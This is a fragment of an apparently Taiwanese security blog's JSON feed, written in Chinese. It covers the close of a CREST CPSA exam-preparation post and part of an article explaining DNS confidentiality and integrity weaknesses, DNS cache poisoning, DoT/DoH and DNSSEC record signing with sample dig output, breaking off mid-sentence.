Microsoft Windows Security Assessment</h3>\n<ol>\n<li>Domain Reconnaissance</li>\n<li>User Enumeration</li>\n<li>Active Directory</li>\n<li>Windows Passwords</li>\n<li>Windows Vulnerabilities</li>\n<li>Windows Patch Management Strategies</li>\n<li>Desktop Lockdown</li>\n<li>Exchange</li>\n<li>Common Windows Applications</li>\n</ol>\n<h3 id=\"module-6%3A-unix-security-assessment\"><a class=\"direct-link\" href=\"#module-6%3A-unix-security-assessment\">#</a> Module 6: UNIX Security Assessment</h3>\n<ol>\n<li>User Enumeration</li>\n<li>UNIX/Linux Vulnerabilities</li>\n<li>FTP</li>\n<li>Sendmail/SMTP</li>\n<li>Network File System (NFS)</li>\n<li>R-Services</li>\n<li>X11</li>\n<li>RPC Services</li>\n<li>SSH</li>\n</ol>\n<h3 id=\"module-7%3A-web-technologies\"><a class=\"direct-link\" href=\"#module-7%3A-web-technologies\">#</a> Module 7: Web Technologies</h3>\n<ol>\n<li>Web Server Operation &amp; Web Servers and Their Flaws</li>\n<li>Web Enterprise Architectures</li>\n<li>Web Protocols</li>\n<li>Web Markup Languages</li>\n<li>Web Programming Languages</li>\n<li>Web Application Servers</li>\n<li>Web APIs</li>\n<li>Web Sub-Components</li>\n</ol>\n<h3 id=\"module-8%3A-web-testing-methodologies\"><a class=\"direct-link\" href=\"#module-8%3A-web-testing-methodologies\">#</a> Module 8: Web-Testing Methodologies</h3>\n<ol>\n<li>Web Application Reconnaissance</li>\n<li>Threat Modelling and Attack Vectors</li>\n<li>Information gathering from Web Mark-up</li>\n<li>Authentication Mechanisms</li>\n<li>Authorisation Mechanisms</li>\n<li>Input Validation</li>\n<li>Information Disclosure in Error Messages</li>\n<li>Use of Cross Site Scripting (XSS)</li>\n<li>Use of Injection Attacks</li>\n<li>Session Handling</li>\n<li>Encryption</li>\n<li>Source Code Review</li>\n</ol>\n<h3 id=\"module-9%3A-web-testing-techniques\"><a class=\"direct-link\" href=\"#module-9%3A-web-testing-techniques\">#</a> Module 9: Web Testing Techniques</h3>\n<ol>\n<li>Web Site Structure Discovery</li>\n<li>Cross Site Scripting Attacks</li>\n<li>SQL Injection</li>\n<li>Parameter Manipulation</li>\n</ol>\n<h3 id=\"module-10%3A-databases\"><a class=\"direct-link\" href=\"#module-10%3A-databases\">#</a> Module 10: Databases</h3>\n<ol>\n<li>Databases</li>\n<li>Microsoft SQL Server</li>\n<li>Oracle RDBMS</li>\n<li>MySQL</li>\n</ol>\n<p>你會發現考試的內容滿廣的，幾乎什麼都有，什麼都考一點，所以剛開始時我會覺得比較難準備，不知道重點應該要放在哪邊。</p>\n<p>因此我做的第一個準備是上網找一些考過的心得，都是英文的：</p>\n<ol>\n<li><a href=\"https://www.reddit.com/r/AskNetsec/comments/9qionx/crest_cpsa_exam/\">CREST CPSA Exam</a></li>\n<li><a href=\"https://blog.rothe.uk/taking-the-cpsa-exam/\">Taking the CPSA (Crest Practitioner Security Analyst) Exam</a></li>\n<li><a href=\"https://www.linkedin.com/pulse/crest-practitioner-security-analyst-cpsa-exam-study-jean/\">CREST Practitioner Security Analyst (CPSA) Exam - Study Guide</a></li>\n</ol>\n<p>第三個寫得最詳細，而且裡面有附滿多參考資料跟資源的，我覺得滿有幫助。</p>\n<p>底下是一些我自己準備的方向：</p>\n<ol>\n<li>各種專有名詞的全稱，例如說 HTTP 或是 SSL 這些的全名是什麼</li>\n<li>網路相關知識，包含 OSI 模型以及 IP, TCP, UDP, ICMP 這些 protocol</li>\n<li>對常見加密演算法（DES、AES 以及 RSA 等等）以及 hash（MD5 跟 SHA1）的基本理解</li>\n<li>DNS 相關知識</li>\n<li>常用的服務對應到哪些 port</li>\n</ol>\n<p>因為自認為自己對 web 比較熟悉，因此 web 的方向我沒有做什麼準備，想說直接正面迎戰。</p>\n<p>CPSA 的及格線是答對 60% 的題目，我採取的策略是集中火力專攻上面那些部分，然後放掉我覺得比較難懂或是一直懶得看的一些主題，所以考試大綱上有些東西我連看都沒看過，考試的時候就是用猜的。</p>\n<p>而我主要準備的資源也不是上面這些，雖然官方建議的書我有買，但看起來有點無聊而且內容滿多的，所以我主要準備是參考我同事找到的一個 GitHub 上有人整理過的資源，用 <code>crest exam github</code> 當關鍵字可以找到，上面有一些很實用的重點整理。</p>\n<p>總之呢，我自己考完之後覺得如果你對網路相關知識已經滿熟悉的了（就計算機概論碰到網路相關問題都可以答對的話），又有基本的 web 知識，稍微唸個一兩週以後要考過應該不難。</p>\n<h2 id=\"cpsa-%E8%80%83%E8%A9%A6\"><a class=\"direct-link\" href=\"#cpsa-%E8%80%83%E8%A9%A6\">#</a> CPSA 考試</h2>\n<p>考試的報名費是 400 美金，大概台幣 11000 左右，台灣似乎只有兩個考場，一個在台北一個在高雄，台北的考場在信義區市政府捷運站附近：<a href=\"https://goo.gl/maps/2hCkEpEidb8WbYQw7\">https://goo.gl/maps/2hCkEpEidb8WbYQw7</a></p>\n<p>需要提前 30 分鐘報到，進入考場之後就是要先把東西全都收進去置物櫃裡面，不能再看書了，所以如果想看的話建議在考場附近看完再進去考場，接著就是報到的流程，記得要帶護照跟上面有簽名的證件（我是拿信用卡），要拍個照然後簽一些文件。</p>\n<p>都弄好以後就會帶你進去測驗的地方，會有許多用木板隔著的個人電腦桌，就用那台電腦來考試，考的時候可以標記題目，之後檢查比較容易。</p>\n<p>似乎是沒有限制一定要考多久，所以考完之後就可以直接用系統交卷了，我好像考了一小時到一個半小時左右，交完以後考場人員會來你的座位上帶你離開，先到外面置物櫃拿東西，東西拿完以後他會直接把測驗結果印給你，上面會寫說你的分數以及有沒有過關，還會有每個大分類的答題狀況。</p>\n<p>我的話最後是低空飛過，驚險過關，接著大概隔個兩三天就會收到 CREST 寄來的證書了。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>整體而言我覺得考試的難度不高但有點瑣碎，我自己網路知識基礎滿差的，所以在這邊掉了不少分數，因此我才說如果網路知識基礎 ok 的話，對於考試應該滿吃香的，至少那些題目都答得出來。</p>\n<p>雖然目前在台灣這張證照的知名度不高，但聽說在國外一些地方有一定的知名度，若是有 OSCP 的話，還可以拿這張證照加上 OSCP 去換另一張 CRT 的證照，一魚兩吃。對我來說的話反正就先考起來，未來會不會用到我也不知道，但先準備好就是了。</p>\n<p>如果大家有興趣的話可以去考考看，有什麼相關的問題也可以在底下留言，在能力範圍內我會盡量回答。</p>\n",
      "date_published": "2021-12-15T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/dns-hacking-2/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/dns-hacking-2/",
      "title": "DNS Hacking 之 電話簿攻防之術：DNSSEC、DoT/DoH",
      "content_html": "<!-- summary -->\n<p>作為網路世界最悠久的協議之一，DNS 最初的設計自然不是以資安考量為主軸。於是，隨著各種技術演進效能提升，越來越多的攻擊手法也應運而生。這次，讓我們來認識 DNS 的資安弱點與相應的防禦方式。</p>\n<!-- summary -->\n<p>有稍微接觸過資安的話，你可能會聽過 CIA 模型或三要素。</p>\n<p>CIA 代表 Confidentiality Integrity Availability 這三個維度。Confidentiality，中文翻譯為『機密性』，表示資料是否只能被具備相應權限的人所存取，未授權者無法觀察或竊聽資料內容。Integrity，中文翻譯為『完整性』，表示資料是真實且可驗證的，或者也可以反過來説：資料是無法竄改或偽造的。Availability，中文翻譯為『可用性』，表示資料的取得不會被干擾、供給不會被中斷。</p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/cia.png\" /><figcaption><p>CIA Triad - 取自 <a href=\"https://www.securitymadesimple.org/cybersecurity-blog/what-are-the-3-principles-of-information-security\">SecurityMadeSimple</a></p>\n</figcaption></figure></p>\n<p>這三個性質被列為設計跟評估資安時的基本準則，違反任何一條都會造成資安上的疑慮與風險，不過當然依據行業跟系統的性質不同會各有特別側重的要素。例如，金融交易要是資訊外流（C）或是交易內容遭到竄改（I）會造成龐大的財務與商譽損失，一丁點錯誤都不能有；電力系統也許更偏重服務的持續性（A），要是隨便一個攻擊就能讓系統癱瘓，一天到晚停電會造成相當大的損失。</p>\n<p>這次，讓我們用 CIA 的角度剖析一下 DNS 有哪些資安弱點，以及為了強化這三個面向而發展出的防禦機制。</p>\n<h2 id=\"confidentiality-(%E6%A9%9F%E5%AF%86%E6%80%A7)\"><a class=\"direct-link\" href=\"#confidentiality-(%E6%A9%9F%E5%AF%86%E6%80%A7)\">#</a> Confidentiality (機密性)</h2>\n<p>DNS 系統中，所有的對話都是以 UDP 明文傳輸，這表示所有的內容（查詢的對象跟結果）都可以被路徑上的觀察者看到。而要達成機密性，表示網路上的竊聽者無法透過觀察流量來判斷使用者發起 DNS lookup 的目標。換句話說，就是要保障使用者存取的內容的匿名跟隱密的特性。</p>\n<p>在這裡，機密性顯然不成立。</p>\n<p>正因為 DNS 本來不具備機密性，導致它成為監視與審查最好下手的目標。當然，審查也是一把雙面刃，美其名曰保護弱者、打擊犯罪，若是被濫用也可能會背上思想控制、侵犯人權與自由的罪名。</p>\n<p>列舉一些耳熟能詳的應用場景，例如電信業者提出兒童防護方案，在偵測到惡意或兒少不宜網站的 DNS queries 時擋下流量。或是數個歐洲國家陸續推出從 DNS 層級過濾流量的計畫來防止用戶訪問發布盜版資源的非法網站。還有公司為了防止機密資料外流及病毒，可能會擋下特定網站、服務、或地區的連線。當然，許多國家也會操控著國內的電信業者來過濾人民存取的內容、監視違反國家利益的行為、甚至利用這些證據。攻擊者可能也會藉此追蹤特定對象的網路足跡，進行更進一步的威脅。</p>\n<p>這種從路徑上的某一點切入，攔截、閱讀、或竄改通訊內容的攻擊，就稱為 on-path attack。應用在不同的場景中，就變成大家或多或少聽過的 man-in-the-middle (MitM)、man-in-the-browser (MitB) 等手法了。</p>\n<p>新聞族繁不及備載：</p>\n<ul>\n<li><a href=\"https://www.nytimes.com/2021/01/09/technology/hong-kong-website-blocked.html\">A Hong Kong Website Gets Blocked, Raising Censorship Fears</a></li>\n<li><a href=\"https://www.ispreview.co.uk/index.php/2021/10/six-big-uk-isps-ordered-to-block-five-piracy-streaming-websites.html\">Six Big UK ISPs Ordered to Block Five Piracy Streaming Websites</a></li>\n<li><a href=\"https://www.wired.co.uk/article/germany-porn-laws-age-checks\">Germany is about to block one of the world's biggest porn sites</a></li>\n</ul>\n<p>為了補足 DNS 缺乏隱私的特性，2016 年 DoT(DNS over TLS) 在 <a href=\"https://datatracker.ietf.org/doc/html/rfc7858\">RFC 7858</a> 中被提出，利用 TLS 協議加密 DNS 流量，讓網路中的竊聽者無法直接看到傳輸的內容，也無法竄改資料（不過這就是完整性的部分了）。</p>\n<p>當然，這之中還有個美中不足的地方，那就是儘管竊聽者看不到 DNS query 的內容，他還是可以夠過監聽 port 53(DNS) 跟 port 853(DoT) 觀察到『有 DNS 流量』的事實。打個比方，就是：雖然我不知道你去醫院看什麼病，但我確定你有進去掛號看診。</p>\n<p>但是，我根本不想要被知道有去過醫院呀！為了完全隱匿蹤跡，2018 年 <a href=\"https://datatracker.ietf.org/doc/html/rfc8484\">RFC 8484</a> 中出現 DoH(DNS over HTTPS)，把 DNS query 藏在有加密的 HTTPS 請求中送到 port 443，這樣一來就只有兩端的發起者跟回覆者知道 DNS lookup 曾經發生過，竊聽者只會看到一連串 HTTPS 的流量但無法辨別隱匿的 DNS query。</p>\n<p>放在一起比較就會長得像下面這張圖：DoT 跟 DoH 都走加密通道，不過 DoH 混雜在一般 HTTPS 的流量中。</p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/dot-doh.png\" /><figcaption><p>DoT DoH</p>\n</figcaption></figure></p>\n<p>這兩種方案哪個比較好呢？這個問題有許多爭議，結論還是以應用場景而定。隱私上當然 DoH 較完整，但管理上難以單獨對 DNS 流量進行配置，以網管人員的角度來說十分複雜。DoT 則相反，能提供網管人員高一些的可視性跟安全感。另一方面，這些隱私機制本身也備受爭議，例如 2019 年的 DDoS 蠕蟲 Godlua 就曾用 DoH 來隱藏跟 command-and-control server 的溝通，以及 Mozilla 支援 DoH 也備受抨擊：<a href=\"https://techcrunch.com/2019/07/05/isp-group-mozilla-internet-villain-dns-privacy/\">Internet group brands Mozilla 'internet villain' for supporting DNS privacy feature</a></p>\n<p>容易被誤會的一點是：用了 DoT DoH 就沒辦法監視流量了嗎？其實也不是。加密只保護端點之間的通訊，所以資料到端點被解密後會經過什麼處理就不在保護範圍內了。所以，你的 DNS 供應商還是可以在接收到 DNS query 後過濾惡意或兒少不宜的內容，或是把你的足跡紀錄起來提供給其他單位的。</p>\n<h2 id=\"integrity-(%E5%AE%8C%E6%95%B4%E6%80%A7)\"><a class=\"direct-link\" href=\"#integrity-(%E5%AE%8C%E6%95%B4%E6%80%A7)\">#</a> Integrity (完整性)</h2>\n<p>前面提過，完整性指的是確保資料無法被篡改或偽造的特性，或者說，具備完整性就表示資料是能被驗證且無法否認的。</p>\n<p>先讓我們來看看幾個故事：<br>\n2014 年，土耳其政府為了<a href=\"https://time.com/32864/turkey-bans-twitter/\">防止人民存取 Twitter</a>，要求當地電信業者將所有對 <a href=\"http://twitter.com\">twitter.com</a> 的 DNS query 導到政府官網，以致人民開始透過國外的 DNS resolver 來規避政府的限制，甚至將 Google 的 DNS 位置 8.8.8.8 噴漆在牆上。</p>\n<p>2008 年，研究員 <a href=\"https://en.wikipedia.org/wiki/Dan_Kaminsky\">Dan Kaminsky</a> 展示了一種 DNS 的攻擊手法，能讓 DNS resolver 儲存錯誤的 DNS 紀錄，導致所有向它發起 DNS query 的人都得到錯誤的答案，藉此劫持流量導向任意網域。這個攻擊稱為 DNS poisoning，透過污染 DNS resolver 中的 DNS 紀錄操控使用者通訊的對象。</p>\n<h3 id=\"dns-cache-poisoning-(dns-spoofing)\"><a class=\"direct-link\" href=\"#dns-cache-poisoning-(dns-spoofing)\">#</a> DNS cache poisoning (DNS spoofing)</h3>\n<p>這個攻擊的成立基於兩個特性：</p>\n<ol>\n<li>DNS 所使用的 UDP 不會驗證收受方 IP 的真實性，我們可以創建一個 UDP 封包然後在來源 IP 隨意指定一個位置，也就是說，我們可以偽造一個來自 Authoritative DNS 的 UDP 封包然後傳給 DNS resolver。</li>\n<li>DNS resolver 發出 DNS query 後，會接受第一個收到的答案，也就是說，如果你可以比真正的 Authoritative DNS 更快回覆一筆答案給 DNS resolver，你的訊息就會被相信並採用。</li>\n</ol>\n<p>因此，這個攻擊的步驟只有兩階段：首先選定一個你想污染的 DNS 紀錄的網域，再向 DNS resolver 發起 DNS query。接著，發送大量的偽造 UDP 回覆（DNS 紀錄放你想指向的 IP）給 DNS resolver，只要其中一個比 Authoritative DNS 的回覆更早抵達，你的假 DNS 紀錄就會被存放在 DNS resolver 中。如此一來，在 TTL 過期以前，其他來詢問此網域的用戶都會被帶到你的網站。</p>\n<p>聽起來簡單，其實實作起來沒那麼容易，因為要偽造回覆你還需要知道幾個資訊：</p>\n<ul>\n<li>這個 DNS query 的 request ID （一組 16-bit 的數字）</li>\n<li>DNS resolver 查找的 Authoritative DNS 的 IP</li>\n<li>DNS resolver 的向 Authoritative DNS 請求實用的 port</li>\n</ul>\n<p>這些資訊在 Kaminsky 提出攻擊時是相對容易取得或猜到的資訊，經過一系列的強化措施（隨機化 port 與 request ID 等）後 DNS poisoning 已經較難成功。</p>\n<p>不過即便如此，現實生活中都還能經常觀察到攻擊發生，根據 <a href=\"https://www.helpnetsecurity.com/2021/10/26/organizations-dns-attacks/\">NISC 的統計報告</a> 指出，72% 的受訪企業一年內曾遭受 DNS 相關攻擊，其中有 33% 就是 DNS poisoning。甚至在幾天前，研究員發現透過 ICMP 的 caching 機制可以讓本來應該隨機化的 port 變得可以預知，導致強化機制失效：<a href=\"https://thehackernews.com/2021/11/new-side-channel-attacks-re-enable.html\">New Side Channel Attacks Re-Enable Serious DNS Cache Poisoning Attacks</a></p>\n<p>當然，最廣為人知的就屬中國的 Great Firewall (GFW)，大家說的翻牆，翻的就是使用 DNS poisoning 來阻擋特定網域的 GFW 呀！今年六月多的一篇論文：<a href=\"https://arxiv.org/abs/2106.02167\">How Great is the Great Firewall? Measuring China's DNS Censorship</a> 發在了資安領域三大 conference 之一的 USENIX Security Symposium，透過長期實驗觀察 GFW 的機制、影響、與規避 DNS poisoning 的方法。</p>\n<p>這一段詳述了 GFW 對 DNS 的操作：</p>\n<blockquote>\n<p>GFW is designed as an on-path/man-on-the-side (MotS) system which takes advantage of UDP-based DNS resolution to inject fake responses when censored domains are detected in users’ DNS queries.<br>\nMore specifically, when the GFW detects a DNS query for a censored domain, it will forge a response with an incorrect DNS record towards the client.<br>\nAs an on-path system, the GFW cannot modify or drop the legitimate response returned by the blocked domain’s authoritative name server or the public resolver chosen by the client. However, since the GFW is usually closer (in terms of physical network distance) to the client, the injected response will usually arrive ahead of the legitimate one, thus being accepted by the client who is now unable to access the domain.</p>\n</blockquote>\n<p>以及繞過 GFW 的方法：</p>\n<blockquote>\n<p>Since the GFW operates as an on-path injector and does not alter the legitimate response from the actual DNS resolver chosen by a client, a circumvention strategy for the client is to not quickly accept any returned responses when querying a censored domain. Instead, the client should wait for an adjustable amount of time for all responses to arrive ... and check them against the injection patterns and forged IPv4 addresses discovered</p>\n</blockquote>\n<p>一句話總結：GFW 離用戶比較近，所以用戶會先收到 GFW 偽造的紀錄並採用，但因為 GFW 不會對真正的紀錄做修改，所以用戶如果等久一點收集多一些回覆，再依據論文中找到的 injection pattern 過濾假的回覆，就可以得到真的答案。</p>\n<p>類似的新聞很多：</p>\n<ul>\n<li><a href=\"https://www.theregister.com/2018/04/24/myetherwallet_dns_hijack/\">AWS DNS network hijack turns MyEtherWallet into ThievesEtherWallet</a></li>\n<li><a href=\"https://abcnews.go.com/Technology/malaysia-airlines-hit-lizard-squad-hack-attack/story?id=28489244\">Malaysia Airlines Hit by Lizard Squad Hack Attack</a></li>\n<li><a href=\"https://www.welivesecurity.com/2021/01/20/dnspooq-bugs-devices-dns-cache-poisoning/\">DNSpooq bugs expose millions of devices to DNS cache poisoning</a></li>\n<li><a href=\"https://www.zdnet.com/article/hacktivists-deface-multiple-sri-lankan-domains-including-google-lk/\">Hacktivists deface multiple Sri Lankan domains, including Google.lk</a></li>\n</ul>\n<h3 id=\"dnssec\"><a class=\"direct-link\" href=\"#dnssec\">#</a> DNSSEC</h3>\n<p>顯而易見，DNS 並不具備完整性的特性，因為我們無法驗證收到的回覆是否是可以信任的。</p>\n<p>那麼，我們要如何讓 DNS 紀錄是可驗證的呢？</p>\n<p>先回想一下，你訪問網站的時候都怎麼確認它是不是值得信任的。不外乎就是確認網址列的網域正確，而且旁邊有個鎖頭，看起滿安全的。</p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/certificate.png\" /><figcaption><p>web certificate</p>\n</figcaption></figure></p>\n<p>這裡的鎖頭顯示為安全，代表網站憑證的驗證通過了。憑證就像是網站的身分證，要經過公認機關（Certificate Authority, CA）的核發才能得到，換言之，擁有合法憑證就代表有值得信任的權威背書，如果你相信這個權威，就可以相信這個網站。這種傳遞信任的邏輯，我們稱做信任鍊。</p>\n<p>同樣的邏輯，如果我們也可以讓 DNS 紀錄有信任鍊的支撐，那我們就不用擔心會收到假的 DNS 紀錄了，因為認可這筆紀錄的是具有公信力的機構，他都覺得沒問題了那我當然也覺得沒問題囉。</p>\n<p>在 DNS 中實作信任鍊的機制，就稱為 DNSSEC，定義在 <a href=\"https://datatracker.ietf.org/doc/html/rfc4033\">RFC 4033</a>、<a href=\"https://datatracker.ietf.org/doc/html/rfc4034\">RFC 4034</a>、<a href=\"https://datatracker.ietf.org/doc/html/rfc4035\">RFC 4035</a> 中，利用不同層級的 DNS server 之間的關係以及三種新的紀錄（DNSKEY、DS、RRSIG）來達成。</p>\n<p>用網站憑證的信任鍊來類比就會很好理解：你想申請的憑證送到 CA 審核後，會被 CA 的 intermediate 憑證簽署，而 intermediate 憑證本身又被 Root CA 的憑證簽章，如此一來，你的憑證就等同於是被 Root CA 所核准。</p>\n<p>換到 DNS 的場景，你把剛剛的『憑證』兩個字換成『DNS 紀錄』，『CA』換成『DNS』就行了。我們再讀一次，把角色名字換一下：你（authoritative DNS）想申請的 DNS 紀錄送到 TLD DNS 審核後，會被 TLD DNS 的 DNS 紀錄簽署，而 TLD DNS 的 DNS 紀錄本身又被 Root DNS 的 DNS 紀錄簽章，如此一來，你的 DNS 紀錄就等同於是被 Root DNS 所核准。</p>\n<p>概念上很簡單吧！不過實作上稍微複雜一些，首先我們用 <code>dnstests.ovh</code> 這個網域的 DNS 紀錄介紹一下前面提過的三種新的紀錄：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">;; ANSWER SECTION:<br>dnstests.ovh.\t\t3599\tIN\tSOA\tdns10.ovh.net. tech.ovh.net. 2021111601 86400 3600 3600000 60<br>dnstests.ovh.\t\t3599\tIN\tRRSIG\tSOA 8 2 3600 20211216102459 20211116102459 24561 dnstests.ovh. npTSXxSbKNeIQ2eljfHkM1kJR20wHLopGcZsnURTiojdno7ZPbnThDzL WmE7dgU4mxGS20xH4fKZIHKUmifDtzg/NmYFJ/wxjLQB2a2t0HDjnq2S 3QYaXYGIVEOunzc/IALJbZvYCbaXLcwAYlZeA19uE8OwXUbJZnK8gKAh GeQ=<br>dnstests.ovh.\t\t3599\tIN\tNS\tdns10.ovh.net.<br>dnstests.ovh.\t\t3599\tIN\tNS\tns10.ovh.net.<br>dnstests.ovh.\t\t3599\tIN\tRRSIG\tNS 8 2 3600 20211216102459 20211116102459 24561 dnstests.ovh. H8C/BVwg+h7BB8S1ZEOdC2PcVbfTaQZ5CwdYjBeq0tQ/T8NO5H5RHu7/ hyVoHEGgUrTmKHgXA27kFZZARbxfImLkSesrzCEDZJinVvyr/5k/UAL5 5ZPaXtPdRznwvY/pELHcIftNIYUg8beYl/MTof3n9utWCBGIbJo3a9U0 RjU=<br>dnstests.ovh.\t\t3599\tIN\tA\t213.186.33.5<br>dnstests.ovh.\t\t3599\tIN\tRRSIG\tA 8 2 3600 20211216102459 20211116102459 24561 dnstests.ovh. ZuGlGMqdb4aUnwjdN7ygG/2F6Vr+K6UnISHgUO68BMaUCqH0q3t+GDyR 7yM269RGkNkYC3/S5q7bSkMYzXxVc4PaQxxDE+LjDuunBJPwniDbmVim XenIIGhlVvP2fGVXiVm5R+kOrMm1nzh/DxGkYKaj4gchd7Iyh4CVRv7i hwk=<br>dnstests.ovh.\t\t59\tIN\tNSEC\tsubdomain.dnstests.ovh. A NS SOA RRSIG NSEC DNSKEY<br>dnstests.ovh.\t\t59\tIN\tRRSIG\tNSEC 8 2 60 20211216102459 20211116102459 24561 dnstests.ovh. BNIpl23leVFMu4D6afbMjGt18+H98n0s05cpRq9VcFj1HyANYS7G7QyM geMKfiaCB4aIhTg2Kfq5g6zEgsQAEYZuGQOJ8mdhPaqdz0xPQd01pDrr I/GUWMaNxVJx6sVMoximt7eAiF0G+FPqSdmi+L6QkiUY0i0TQo2fymYs qSg=<br>dnstests.ovh.\t\t3599\tIN\tDNSKEY\t257 3 8 AwEAAdnP4dGVQ7yMFi1GvCXQAxfw+p1mpXb2ORwbh/Lt6A6JvwUmhUGF WobYWrX8TTs7wR4l9o+qfS9ZJbEqqFmZsfkGz0whzkzJdnr/N6QyOWF9 c9m+zOpPD/l3xKar6xJkz6HpSNxH404ftBfQeN60H9g4i0AcKQWjkQFS I9vOjaCGbsfbI9/meFNAU77zAU/SkG2SCaPq+aMVPNJnBRR4Z03NLAp+ wijg5eWCuSjB5qtmr+azdKOW4Q6hHgNzkQJqQNzfPz/tu84jis/7fsbJ ScT7Nfv8N+anf956RBuRLHbDiXCrzmeKPF6CUKUo3hkD2bDRIXu0z/LW UQvd1Mqsqlk=<br>dnstests.ovh.\t\t3599\tIN\tDNSKEY\t256 3 8 AwEAAbuItCAOIzcSvBfHIYl5JbzHjbA2RVHKA9/dvCgbCFQEA/7Q6IUU IVHoEfd+oPuz0rnV9Xq6R2GI89wrAOCp2aGaeFm+pin4eugTtzyBNTyr RKHd/OmDWkfDyLS37jhZmI2dWxNNAWWkAQBPOmH3g+J84IiIZ2JnQKZ2 /3aLj527<br>dnstests.ovh.\t\t3599\tIN\tRRSIG\tDNSKEY 8 2 3600 20211216102459 20211116102459 2839 dnstests.ovh. l9NCVGEfxryUSKngfVJ6WyTGkEVtZSobzwHXZOA61hN5rKBB3vTi/kQn bUhW43zHUJOgMKRV+m1DNZUaqVKBDQvaZj2oM4AJLDNzOUDEjFFzdhZr Q8b8LoRhC694HCJ31NRuO1YN5cDlgTE+q378eNd3MQeimang0eBa43rQ 88xV2uZ5A/QbawEfk+aGIul9i3TF+qHsPSXPon1nXj29FHo8xxsXdy7E YJb8d/AvNqHALkrd6Us0UuhXflrYurlW/NNt1j+xvbdJ8Z8WsRqcrkFQ XKR2y0WDSRGzH3CLVGiUWR1DVqbxtqrx12NYGgDOEVypNyv7bGrFf8jc 6DS84g==<br>dnstests.ovh.\t\t3599\tIN\tRRSIG\tDNSKEY 8 2 3600 20211216102459 20211116102459 24561 dnstests.ovh. tNZAVJgCYtWMlzb3mdVn3QSpmH6noIo17nkkmP7TiLb/0KmiqcRIZhJv lFNR6zsjym5V4WkFEJD2Cc/0fd5kPWHbVTEICTeDvOh3h/YTbetGDNhu 0MpLpN5UwWGayADkIKY0a8IKg7+uimQKFtR0zA6GFw6Yyx6XXqaohXSq LAY=<br></code></pre>\n<p>紀錄類型標記在 IN 之後，你會發現一個有趣的規律：同一種類型的紀錄會放在一起，稱為一個 RRset (resource record set)，而且在每個 RRset 之後都接著一筆 RRSIG 紀錄。</p>\n<blockquote>\n<p>如同簽署網站憑證會有公鑰私鑰，簽署 DNS 紀錄同樣也用數位簽章的技術，所以發出去的公鑰就是放在 DNSKEY 紀錄裡，而簽完每一種 RRset 的結果會放在 RRSIG 紀錄裡。</p>\n</blockquote>\n<p>範例中你會觀察到，RRSIG 紀錄的第五個欄位（就是 'RRSIG' 字串後的那個）都會標記簽署的是哪一種 RRset，然後最後一個欄位是一大堆加密字串，也就是簽章本人。</p>\n<p>你可能也發現，為什麼會有兩筆 DNSKEY 紀錄？</p>\n<p>那是因為，DNSSEC 的機制裡會生成兩對公私鑰組合，一對稱為 ZSK (zone signing key)，就是剛剛用來簽署其他 RRset 用的，是上面 DNSKEY 紀錄中第五個欄位寫 256 的那一把；另一對稱為 KSK (key signing key)，是用來簽署 DNSKEY 紀錄的，第五個欄位寫 257。</p>\n<p>有了 ZSK 我們就能驗證 RRset 的真偽，但是我們怎麼知道 ZSK 本人不是偽造的紀錄呢？這就是 KSK 的職責之一：用數位簽章來保護 ZSK，把信任鍊的擔保責任從末端的 RRset 交到 ZSK 再轉移到 KSK 身上。</p>\n<p>仔細看下圖 RRSIG 紀錄的欄位，特別標出來的是簽署的 RRset 類型跟標示要用哪一把 DNSKEY 驗證的 key tag（不是 uuid，而是由 DNSKEY 中的欄位算出來的數字）。再回去看上面的範例，就會發現簽署 A NS MX 等紀錄用的都是 24561 （ZSK 的 key tag），但倒數第二筆簽署 DNSKEY 紀錄時用的是 2839 （KSK 的 key tag）。</p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/rrsig.png\" /><figcaption><p>RRSIG from <a href=\"https://docs.infoblox.com/display/NAG8/RRSIG+Resource+Records\">Infoblox</a></p>\n</figcaption></figure></p>\n<p>但是就算多了一個 KSK 來保護 ZSK 也不夠啊？KSK 不就還是有可能是假的嗎？</p>\n<p>沒錯！所以必須要有下一個 <s>替死鬼</s> DNS 紀錄來傳承信任鍊。這個任務會交給上一層 zone 來驗證，當我們要驗證 <code>dnstests.ovh</code> 的 DNSKEY 時要去找 <code>.ovh</code>，而介接這兩層的方式，就是用放在上層 <code>.ovh</code> 的 DS 紀錄。</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">dnstests.ovh.\t\t21600\tIN\tDS\t2839 8 2 D33EA743F0D93C6E62CF899DC32F5CBBBC340853C69CAA65C77BAE0F 1764EE29</code></pre>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/ds.png\" /><figcaption><p>DS from <a href=\"https://docs.infoblox.com/display/NAG8/DS+Resource+Records\">Infoblox</a></p>\n</figcaption></figure></p>\n<p>如圖所示，DS 紀錄的主要內容就是 child zone 的 KSK(key tag 2839) 的 hash 值，放在 digest 欄位，前面的數字則指示了 hash 與 child KSK 用的演算法，以及 child KSK 的 key tag。補充一下，雖然圖中看不出來，不過 DNSKEY(KSK) 紀錄跟驗證他的 DS 紀錄有著同樣的 owner 值，只是存放在不同層級的 zone 之中。</p>\n<p>有了 DS 紀錄串接兩層，後面就好辦了。畢竟 DS 紀錄其實也就是一筆一般的紀錄，所以也會被該 zone 的 ZSK 簽署，重複我們最一開始建構信任鍊的流程。至此， zone 之內與跨 zone 的連結都有了，我們就可以用下面這張圖描述 DNSSEC 的機制：</p>\n<p><figure><img src=\"/img/posts/crystal/dns-hacking/chain.png\" /><figcaption><p>trust chain from <a href=\"https://blog.cloudflare.com/dnssec-an-introduction/\">Cloudfare</a></p>\n</figcaption></figure></p>\n<p>這張圖里的箭頭標示出的是簽章的方向，也是信任建構的方向。從最末端的 <code>example.com</code> A 紀錄，經過 zone 內的 DNSKEY 連結到上一層的 <code>.com</code> zone，在一路傳遞到最上層 <code>.</code> root zone 的 DNSKEY(KSK)。這把 root KSK 是世界上所有機器都知道且設定信任的資訊，而且他的創立與簽署是需要經過一群人每隔五六年舉行  Root Zone Signing Ceremony 才能完成的呢！</p>\n<p>稍微延伸一下，因為 KSK 是每個 zone 中的信任根基，所以又稱為 trust anchor，取個定錨的概念。有些人會困惑：明明 ZSK KSK 